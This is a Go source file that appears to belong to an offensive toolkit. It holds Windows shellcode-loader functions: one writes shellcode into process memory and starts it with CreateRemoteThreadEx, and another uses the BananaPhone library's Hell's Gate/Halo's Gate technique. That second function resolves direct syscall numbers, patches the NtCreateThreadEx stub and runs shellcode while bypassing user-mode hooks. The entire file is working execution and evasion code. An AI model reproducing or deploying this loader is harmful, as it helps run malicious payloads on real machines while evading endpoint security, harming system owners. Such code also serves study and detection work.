package core

import (
  "fmt"
  "unsafe"
  "errors"
  "syscall"

  bap "github.com/C-Sto/BananaPhone/pkg/BananaPhone"

  // Internal
  "golang.org/x/sys/windows"
)

func CreateRemoteThread(shellcode []byte) (error) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

  GetCurrentProcess := kernel32.NewProc("GetCurrentProcess")
  VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
  VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
  WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
	CloseHandle := kernel32.NewProc("CloseHandle")

  pHandle, _, _ := GetCurrentProcess.Call()

  addr, _, _ := VirtualAllocEx.Call(
    uintptr(pHandle),
    0,
    uintptr(len(shellcode)),
    windows.MEM_COMMIT | windows.MEM_RESERVE,
    windows.PAGE_READWRITE,
  )

	if addr == 0 {
		return errors.New("VirtualAllocEx failed and returned 0")
	}

  WriteProcessMemory.Call(
    uintptr(pHandle),
    addr,
    (uintptr)(unsafe.Pointer(&shellcode[0])),
    uintptr(len(shellcode)),
  )

  oldProtect := windows.PAGE_READWRITE
  VirtualProtectEx.Call(
    uintptr(pHandle),
    addr,
    uintptr(len(shellcode)),
    windows.PAGE_EXECUTE_READ,
    uintptr(unsafe.Pointer(&oldProtect)),
  )

  CreateRemoteThreadEx.Call(
    uintptr(pHandle),
    0,
    0,
    addr,
    0,
    0,
    0,
  )

  _, _, errCloseHandle := CloseHandle.Call(pHandle)
  if errCloseHandle != nil {
    return errCloseHandle
  }

  return nil
}

/*

Hell's Gate + Halo's Gate function

*/

func CreateRemoteThreadHalos(shellcode []byte) (error) {
  kernel32DLL := windows.NewLazySystemDLL("kernel32.dll")
  VirtualProtectEx := kernel32DLL.NewProc("VirtualProtectEx")

  bp, e := bap.NewBananaPhone(bap.AutoBananaPhoneMode)
  if e != nil {
    return e
  }

  mess, e := bp.GetFuncPtr("NtCreateThreadEx")
  if e != nil {
		return e
	}
	
	oldProtect := windows.PAGE_EXECUTE_READ
	VirtualProtectEx.Call(uintptr(0xffffffffffffffff), uintptr(mess), uintptr(0x100), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtect)))
	
	WriteMemory([]byte{0x90, 0x90, 0x4c, 0x8b, 0xd1, 0xb8, 0xc1, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90}, uintptr(mess))
	
	alloc, e := GetSysId("NtAllocateVirtualMemory")
	if e != nil {
		return e
	}
  protect, e := GetSysId("NtProtectVirtualMemory")
  if e != nil {
    return e
  }
  createthread, e := GetSysId("NtCreateThreadEx")
  if e != nil {
    return e
  }

  createThread(shellcode, uintptr(0xffffffffffffffff), alloc, protect, createthread)
  
  return nil
}

// Helper func

func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16) {
  const (
    thisThread = uintptr(0xffffffffffffffff)
    memCommit  = uintptr(0x00001000)
    memreserve = uintptr(0x00002000)
  )

  var baseA uintptr
  regionsize := uintptr(len(shellcode))
  r1, r := Syscall(
    NtAllocateVirtualMemorySysid,
    handle,
    uintptr(unsafe.Pointer(&baseA)),
    0,
    uintptr(unsafe.Pointer(&regionsize)),
    uintptr(memCommit|memreserve),
    syscall.PAGE_READWRITE,
  )
  if r != nil {
    fmt.Printf("1 %s %x\n", r, r1)
    return
  }
  WriteMemory(shellcode, baseA)

  var oldprotect uintptr
  r1, r = Syscall(
    NtProtectVirtualMemorySysid,
    handle,
    uintptr(unsafe.Pointer(&baseA)),
    uintptr(unsafe.Pointer(&regionsize)),
    syscall.PAGE_EXECUTE_READ,
    uintptr(unsafe.Pointer(&oldprotect)),
  )

  var hhosthread uintptr
  r1, r = Syscall(
    NtCreateThreadExSysid,
    uintptr(unsafe.Pointer(&hhosthread)),
    0x1FFFFF,
    0,
    handle,
    baseA,
    0,
    uintptr(0),
    0,
    0,
    0,
    0,
  )

  syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
}


